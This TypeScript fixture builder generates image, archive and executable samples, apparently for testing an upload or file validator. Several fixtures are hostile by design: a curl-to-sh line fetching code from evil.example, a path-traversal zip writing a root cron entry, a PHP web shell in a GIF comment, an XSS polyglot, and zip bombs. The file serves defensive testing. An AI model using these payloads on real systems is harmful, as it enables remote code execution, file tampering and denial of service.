/**
 * Fixture builders. Everything here is generated from code — the repository
 * contains no binary test assets, and the fixtures that are deliberately
 * malicious are constructed by hand so their structure is documented.
 *
 * Two rules for this file:
 *  - Every generator is deterministic (no Math.random, no clock).
 *  - Malicious fixtures are built by *writing headers honestly* and then
 *    making them lie, never by running a tool that could execute anything.
 */
import { deflateRawSync, crc32, gzipSync } from 'node:zlib';
import pngjs from 'pngjs';
import jpeg from 'jpeg-js';
import omggif from 'omggif';
import { createHash } from 'node:crypto';

const { PNG } = pngjs as unknown as {
  PNG: {
    sync: {
      read: (b: Buffer) => { width: number; height: number; data: Buffer };
      write: (p: { width: number; height: number; data: Buffer }, o?: Record<string, unknown>) => Buffer;
    };
  };
};
const { encode: jpegEncode } = jpeg as unknown as {
  encode: (i: { data: Uint8Array; width: number; height: number }, q?: number) => { data: Buffer };
};
const { GifWriter } = omggif as unknown as {
  GifWriter: new (b: Buffer, w: number, h: number, o?: Record<string, unknown>) => {
    addFrame: (x: number, y: number, w: number, h: number, px: number[], o?: Record<string, unknown>) => number;
    end: () => number;
  };
};

export const ENT = (suffix = '') => `fixture-${suffix}`;

/** Deterministic pseudo-random bytes (xorshift32) so fixtures are stable. */
export function prng(seed: number): () => number {
  let s = seed >>> 0 || 1;
  return () => {
    s ^= s << 13;
    s >>>= 0;
    s ^= s >>> 17;
    s ^= s << 5;
    s >>>= 0;
    return s / 0x1_0000_0000;
  };
}

export function bytesOf(n: number, seed = 1): Buffer {
  const r = prng(seed);
  const b = Buffer.alloc(n);
  for (let i = 0; i < n; i++) b[i] = Math.floor(r() * 256);
  return b;
}

// ---------------------------------------------------------------------------
// Images
// ---------------------------------------------------------------------------

export interface PngOptions {
  width?: number;
  height?: number;
  /** Extra tEXt chunk payload text. */
  text?: string;
  /** Append this after IEND (the classic "image carrying a payload"). */
  tail?: Buffer;
}

export function makePng(opts: PngOptions = {}): Buffer {
  const width = opts.width ?? 64;
  const height = opts.height ?? 48;
  const data = Buffer.alloc(width * height * 4);
  const r = prng(width * height + 7);
  for (let y = 0; y < height; y++) {
    for (let x = 0; x < width; x++) {
      const i = (y * width + x) * 4;
      data[i] = Math.floor((x / width) * 255);
      data[i + 1] = Math.floor((y / height) * 255);
      data[i + 2] = Math.floor(r() * 256);
      data[i + 3] = 255;
    }
  }
  let out = PNG.sync.write({ width, height, data } as never);
  if (opts.text) out = insertPngChunk(out, 'tEXt', Buffer.from(`Comment\0${opts.text}`, 'latin1'));
  if (opts.tail) out = Buffer.concat([out, opts.tail]);
  return out;
}

/** Inserts a chunk immediately before IEND, recomputing its CRC. */
export function insertPngChunk(png: Buffer, type: string, payload: Buffer): Buffer {
  const iend = png.lastIndexOf(Buffer.from('IEND', 'latin1'));
  if (iend < 0) return png;
  const chunkStart = iend - 4;
  const chunk = Buffer.alloc(12 + payload.length);
  chunk.writeUInt32BE(payload.length, 0);
  chunk.write(type, 4, 'latin1');
  payload.copy(chunk, 8);
  const crc = crc32(Buffer.concat([Buffer.from(type, 'latin1'), payload])) >>> 0;
  chunk.writeUInt32BE(crc, 8 + payload.length);
  return Buffer.concat([png.subarray(0, chunkStart), chunk, png.subarray(chunkStart)]);
}

export function makeJpeg(opts: { width?: number; height?: number; tail?: Buffer } = {}): Buffer {
  const width = opts.width ?? 64;
  const height = opts.height ?? 48;
  const data = Buffer.alloc(width * height * 4);
  const r = prng(width + height);
  for (let i = 0; i < width * height; i++) {
    data[i * 4] = Math.floor(r() * 256);
    data[i * 4 + 1] = Math.floor((i % width) * (255 / width));
    data[i * 4 + 2] = Math.floor((i / width) * (255 / height));
    data[i * 4 + 3] = 255;
  }
  const out = jpegEncode({ data, width, height }, 80).data;
  return opts.tail ? Buffer.concat([out, opts.tail]) : out;
}

/** Builds a JPEG carrying an APP1 Exif segment before the frame header. */
export function jpegWithExif(exifPayload: string): Buffer {
  const base = makeJpeg();
  const payload = Buffer.from(exifPayload, 'latin1');
  const seg = Buffer.alloc(4 + payload.length);
  seg[0] = 0xff;
  seg[1] = 0xe1;
  seg.writeUInt16BE(payload.length + 2, 2);
  payload.copy(seg, 4);
  // Insert after SOI (first two bytes).
  return Buffer.concat([base.subarray(0, 2), seg, base.subarray(2)]);
}

export function makeGif(opts: { width?: number; height?: number; frames?: number; comment?: string; tail?: Buffer } = {}): Buffer {
  const width = opts.width ?? 32;
  const height = opts.height ?? 32;
  const frames = opts.frames ?? 1;
  const buf = Buffer.alloc(1024 * 1024);
  const palette: number[] = [];
  for (let i = 0; i < 256; i++) palette.push((i << 16) | ((255 - i) << 8) | (i * 7 & 0xff));
  const w = new GifWriter(buf, width, height, { palette, loop: 0 });
  for (let f = 0; f < frames; f++) {
    const px = new Array(width * height);
    for (let i = 0; i < px.length; i++) px[i] = (i + f * 17) & 0xff;
    w.addFrame(0, 0, width, height, px, { delay: 10 });
  }
  const end = w.end();
  let out = buf.subarray(0, end);
  if (opts.comment) {
    const text = Buffer.from(opts.comment, 'latin1');
    const block = Buffer.concat([Buffer.from([0x21, 0xfe]), chunkSubBlocks(text), Buffer.from([0x00])]);
    const trailer = out.length - 1;
    out = Buffer.concat([out.subarray(0, trailer), block, out.subarray(trailer)]);
  }
  return opts.tail ? Buffer.concat([out, opts.tail]) : Buffer.from(out);
}

function chunkSubBlocks(data: Buffer): Buffer {
  const parts: Buffer[] = [];
  for (let i = 0; i < data.length; i += 255) {
    const slice = data.subarray(i, i + 255);
    parts.push(Buffer.from([slice.length]), slice);
  }
  return Buffer.concat(parts);
}

export function makeWebpStub(width = 16, height = 16): Buffer {
  // A minimal RIFF/WEBP with VP8X + a fake VP8 chunk. Enough for structural
  // parsing; not a decodable image, which is why it is only used in tests that
  // assert on container parsing.
  const vp8x = Buffer.alloc(18);
  vp8x.write('VP8X', 0, 'latin1');
  vp8x.writeUInt32LE(10, 4);
  vp8x[8] = 0; // flags
  writeU24LE(vp8x, 9, width - 1);
  writeU24LE(vp8x, 12, height - 1);
  const payloadLen = vp8x.length;
  const header = Buffer.alloc(12);
  header.write('RIFF', 0, 'latin1');
  header.writeUInt32LE(payloadLen + 4, 4);
  header.write('WEBP', 8, 'latin1');
  return Buffer.concat([header, vp8x]);
}

function writeU24LE(b: Buffer, o: number, v: number): void {
  b[o] = v & 0xff;
  b[o + 1] = (v >> 8) & 0xff;
  b[o + 2] = (v >> 16) & 0xff;
}

/** Minimal 24bpp BMP. */
export function makeBmp(width = 8, height = 8): Buffer {
  const rowSize = Math.ceil((width * 3) / 4) * 4;
  const pixelSize = rowSize * height;
  const fileSize = 14 + 40 + pixelSize;
  const b = Buffer.alloc(fileSize);
  b.write('BM', 0, 'latin1');
  b.writeUInt32LE(fileSize, 2);
  b.writeUInt32LE(54, 10);
  b.writeUInt32LE(40, 14);
  b.writeInt32LE(width, 18);
  b.writeInt32LE(height, 22);
  b.writeUInt16LE(1, 26);
  b.writeUInt16LE(24, 28);
  b.writeUInt32LE(pixelSize, 34);
  for (let i = 54; i < fileSize; i++) b[i] = (i * 13) & 0xff;
  return b;
}

/** Minimal ICO with one 16x16 32bpp image. */
export function makeIco(): Buffer {
  const w = 16;
  const h = 16;
  const imageSize = 40 + w * h * 4;
  const b = Buffer.alloc(6 + 16 + imageSize);
  b.writeUInt16LE(0, 0);
  b.writeUInt16LE(1, 2);
  b.writeUInt16LE(1, 4);
  b[6] = w;
  b[7] = h;
  b.writeUInt16LE(1, 10);
  b.writeUInt16LE(32, 12);
  b.writeUInt32LE(imageSize, 14);
  b.writeUInt32LE(22, 18);
  // BITMAPINFOHEADER with doubled height for the AND mask convention.
  b.writeUInt32LE(40, 22);
  b.writeInt32LE(w, 26);
  b.writeInt32LE(h * 2, 30);
  b.writeUInt16LE(1, 34);
  b.writeUInt16LE(32, 36);
  for (let i = 62; i < b.length; i++) b[i] = (i * 7) & 0xff;
  return b;
}

/** Minimal little-endian TIFF with one strip of uncompressed RGB. */
export function makeTiff(width = 4, height = 4): Buffer {
  const pixelBytes = width * height * 3;
  const header = Buffer.alloc(8);
  header.write('II', 0, 'latin1');
  header.writeUInt16LE(42, 2);
  header.writeUInt32LE(8, 4);
  // IFD: 3 entries (width, height, strip offset) + next-IFD pointer.
  const entries = 3;
  const ifdSize = 2 + entries * 12 + 4;
  const stripOffset = 8 + ifdSize;
  const ifd = Buffer.alloc(ifdSize);
  ifd.writeUInt16LE(entries, 0);
  let o = 2;
  const entry = (tag: number, type: number, count: number, value: number) => {
    ifd.writeUInt16LE(tag, o);
    ifd.writeUInt16LE(type, o + 2);
    ifd.writeUInt32LE(count, o + 4);
    ifd.writeUInt32LE(value, o + 8);
    o += 12;
  };
  entry(0x0100, 4, 1, width);
  entry(0x0101, 4, 1, height);
  entry(0x0111, 4, 1, stripOffset);
  ifd.writeUInt32LE(0, o);
  const pixels = Buffer.alloc(pixelBytes);
  for (let i = 0; i < pixelBytes; i++) pixels[i] = (i * 31) & 0xff;
  return Buffer.concat([header, ifd, pixels]);
}

// ---------------------------------------------------------------------------
// Archives — written honestly, one field at a time.
// ---------------------------------------------------------------------------

export interface ZipWriteEntry {
  name: string;
  /** Pre-compressed payload when `stored` is true. */
  data: Buffer;
  compress?: boolean;
  method?: number;
  /** Override the declared uncompressed size (for bomb fixtures). */
  declaredSize?: number;
  /** Override the declared compressed size. */
  declaredCompressed?: number;
  /** Force sizes to 0 with flag bit 3 set (streamed-zip lookalike). */
  hideSizes?: boolean;
}

export function buildZip(entries: ZipWriteEntry[], comment = ''): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;
  for (const e of entries) {
    const nameBuf = Buffer.from(e.name, 'utf-8');
    const method = e.method ?? (e.compress ? 8 : 0);
    const compressed = method === 8 ? deflateRawSync(e.data) : e.data;
    const crc = crc32(e.data) >>> 0;
    const flags = e.hideSizes ? 0x0008 : 0x0800;
    // ZIP32 fields: clamp rather than throw so a fixture can declare the
    // largest value the field can hold.
    const u32 = (n: number) => Math.min(0xffffffff, Math.max(0, Math.trunc(n)));
    const declaredCompressed = e.hideSizes ? 0 : u32(e.declaredCompressed ?? compressed.length);
    const declaredSize = e.hideSizes ? 0 : u32(e.declaredSize ?? e.data.length);

    const local = Buffer.alloc(30 + nameBuf.length);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(flags, 6);
    local.writeUInt16LE(method, 8);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(declaredCompressed, 18);
    local.writeUInt32LE(declaredSize, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    local.writeUInt16LE(0, 28);
    nameBuf.copy(local, 30);
    locals.push(local, compressed);

    const central = Buffer.alloc(46 + nameBuf.length);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(flags, 8);
    central.writeUInt16LE(method, 10);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(declaredCompressed, 20);
    central.writeUInt32LE(declaredSize, 24);
    central.writeUInt16LE(nameBuf.length, 28);
    central.writeUInt32LE(offset, 42);
    nameBuf.copy(central, 46);
    centrals.push(central);

    offset += local.length + compressed.length;
  }
  const cd = Buffer.concat(centrals);
  const commentBuf = Buffer.from(comment, 'utf-8');
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cd.length, 12);
  eocd.writeUInt32LE(offset, 16);
  eocd.writeUInt16LE(commentBuf.length, 20);
  return Buffer.concat([...locals, cd, eocd, commentBuf]);
}

/** A zip whose one member declares a huge size but deflates to almost nothing. */
export function makeZipBomb(opts: { declaredMiB: number; actualBytes?: number }): Buffer {
  const actual = bytesOf(opts.actualBytes ?? 1024, 42);
  return buildZip([
    {
      name: 'bomb.bin',
      data: actual,
      compress: true,
      declaredSize: opts.declaredMiB * 1024 * 1024
    }
  ]);
}

/** A zip whose member *really* expands to `mib` MiB of zeroes. */
export function makeRealZipBomb(mib: number): Buffer {
  const zeros = Buffer.alloc(mib * 1024 * 1024);
  return buildZip([{ name: 'zeros.bin', data: zeros, compress: true }]);
}

/**
 * A zip whose member really expands to `size` bytes, streamed so the fixture
 * itself stays small in memory. Used for the ratio tests where honest declared
 * sizes matter.
 */
export function makeRealZipBombSized(size: number): Buffer {
  const zeros = Buffer.alloc(size);
  return buildZip([{ name: 'zeros.bin', data: zeros, compress: true }]);
}

/** 42.zip-ish: nested levels of highly-compressible archives. */
export function makeNestedZip(depth: number): Buffer {
  let inner = buildZip([{ name: 'payload.txt', data: Buffer.alloc(64 * 1024), compress: true }]);
  for (let d = 1; d < depth; d++) {
    inner = buildZip([{ name: `level-${d}.zip`, data: inner, compress: true }]);
  }
  return inner;
}

/** Zip with an entry named to escape the extraction root. */
export function makePathTraversalZip(): Buffer {
  return buildZip([
    { name: '../../etc/cron.d/evil', data: Buffer.from('* * * * * root id\n'), compress: true },
    { name: 'ok.txt', data: Buffer.from('hello'), compress: true }
  ]);
}

/** Zip with overlapping-entry style contradictory sizes. */
export function makeOverlapZip(): Buffer {
  return buildZip([
    { name: 'a.bin', data: bytesOf(64, 3), compress: true, declaredSize: 0x7fffffff },
    { name: 'b.bin', data: bytesOf(64, 4), compress: true, declaredSize: 0x7fffffff }
  ]);
}

/** A file that is a valid PNG *and* a valid ZIP: PNG prefix, zip appended
 *  after IEND, with the central directory offsets shifted so the zip parser
 *  must discover the prepended data (the real-world polyglot). */
export function makePngZipPolyglot(): Buffer {
  const png = makePng();
  const inner = buildZip([{ name: 'inside.txt', data: Buffer.from('polyglot payload'), compress: true }]);
  // The zip's stored offsets are relative to `inner`. Prepending `png` shifts
  // every offset, which a naive parser will not handle — ours does.
  return Buffer.concat([png, inner]);
}

/** A file that is a valid JPEG *and* an HTML document: HTML first, JPEG after.
 *  This is the "stored XSS with an image content type" shape. */
export function makeHtmlJpegPolyglot(): Buffer {
  const html = Buffer.from(
    '<!doctype html><html><body><script>alert(document.domain)</script></body></html>\n',
    'utf-8'
  );
  return Buffer.concat([html, makeJpeg()]);
}

/** Valid GIF whose comment block says it is a script; still one format. */
export function makeGifWithComment(): Buffer {
  return makeGif({ comment: '<?php system($_GET["c"]); ?>' });
}

/** A zip that is itself an office document (OOXML). */
export function makeDocxLike(): Buffer {
  return buildZip([
    { name: '[Content_Types].xml', data: Buffer.from('<?xml version="1.0"?><Types/>'), compress: true },
    { name: 'word/document.xml', data: Buffer.from('<w:document/>'), compress: true }
  ]);
}

/** Multi-member gzip. */
export function makeMultiMemberGzip(): Buffer {
  return Buffer.concat([gzipSync(Buffer.from('first member')), gzipSync(Buffer.from('second member'))]);
}

/** Plain gzip of text. */
export function makeGzip(data = 'hello gzip'): Buffer {
  return gzipSync(Buffer.from(data, 'utf-8'));
}

/** Gzip whose payload is a zip (the double-compressed shape). */
export function makeGzipOfZip(): Buffer {
  return gzipSync(buildZip([{ name: 'x.txt', data: Buffer.from('deep'), compress: true }]));
}

/** Minimal ustar archive with one file. */
export function makeTar(name = 'hello.txt', data = 'hello tar'): Buffer {
  const payload = Buffer.from(data, 'utf-8');
  const header = Buffer.alloc(512);
  header.write(name, 0, 'utf-8');
  header.write('0000644', 100, 'latin1');
  header.write('0000000', 108, 'latin1');
  header.write('0000000', 116, 'latin1');
  header.write(payload.length.toString(8).padStart(11, '0') + '0', 124, 'latin1');
  header.write('00000000000', 136, 'latin1');
  header.write('        ', 148, 'latin1');
  header.write('0', 156, 'latin1');
  header.write('ustar\u000000', 257, 'latin1');
  let sum = 0;
  for (const c of header) sum += c;
  header.write(sum.toString(8).padStart(6, '0') + '\u0000 ', 148, 'latin1');
  const padded = Buffer.alloc(Math.ceil(payload.length / 512) * 512);
  payload.copy(padded);
  return Buffer.concat([header, padded, Buffer.alloc(1024)]);
}

/**
 * Minimal but structurally valid xz stream: 12-byte stream header, no blocks,
 * an Index declaring `declaredTotal`, and a 12-byte stream footer. It exercises
 * the backwards-walk reader without requiring a real LZMA2 encoder.
 */
export function makeXzStub(declaredTotal: number): Buffer {
  const header = Buffer.alloc(12);
  Buffer.from([0xfd, 0x37, 0x7a, 0x58, 0x5a, 0x00]).copy(header, 0);
  header[6] = 0x00; // stream flags
  header[7] = 0x04;
  const index = buildXzIndex([declaredTotal]);
  const footer = Buffer.alloc(12);
  footer.writeUInt32LE(index.length / 4 - 1, 4); // backward size
  footer[8] = 0x00;
  footer[9] = 0x04;
  footer[10] = 0x59; // 'Y'
  footer[11] = 0x5a; // 'Z'
  return Buffer.concat([header, index, footer]);
}

function buildXzIndex(sizes: number[]): Buffer {
  const parts: number[] = [0x00];
  parts.push(...varint(sizes.length));
  for (const s of sizes) {
    parts.push(...varint(1)); // unpadded size placeholder
    parts.push(...varint(s));
  }
  while (parts.length % 4 !== 0) parts.push(0x00);
  return Buffer.from(parts);
}

function varint(v: number): number[] {
  const out: number[] = [];
  do {
    let byte = v & 0x7f;
    v = Math.floor(v / 128);
    if (v > 0) byte |= 0x80;
    out.push(byte);
  } while (v > 0);
  return out;
}

/** A bzip2-looking header, deliberately not decodable: tests fail-closed path. */
export function makeBzip2Stub(): Buffer {
  return Buffer.concat([Buffer.from('BZh91AY&SY', 'latin1'), bytesOf(64, 9)]);
}

/** 7z magic plus garbage: preflight must refuse to guess a size. */
export function make7zStub(): Buffer {
  return Buffer.concat([
    Buffer.from([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c]),
    Buffer.alloc(2),
    bytesOf(64, 11)
  ]);
}

/** Generic ELF header. */
export function makeElfStub(): Buffer {
  const b = Buffer.alloc(128);
  Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]).copy(b, 0);
  return b;
}

/** PE: MZ header plus a valid e_lfanew pointing at a PE signature. */
export function makePeStub(): Buffer {
  const b = Buffer.alloc(256);
  b.write('MZ', 0, 'latin1');
  b.writeUInt32LE(0x80, 0x3c);
  b.write('PE\u0000\u0000', 0x80, 'latin1');
  return b;
}

/** PDF with a JavaScript action and a deliberately long tail. */
export function makePdfStub(withJs: boolean, tail = ''): Buffer {
  const js = withJs
    ? '1 0 obj<</S/JavaScript/JS(app.alert(1))>>endobj\n'
    : '';
  const body = `%PDF-1.7\n${js}1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\nstartxref\n0\n%%EOF\n${tail}`;
  return Buffer.from(body, 'latin1');
}

/** UTF-8 text with a shebang. */
export function makeShellScript(): Buffer {
  return Buffer.from('#!/bin/sh\ncurl http://evil.example/x | sh\n', 'utf-8');
}

export function sha256(b: Buffer): string {
  return createHash('sha256').update(b).digest('hex');
}
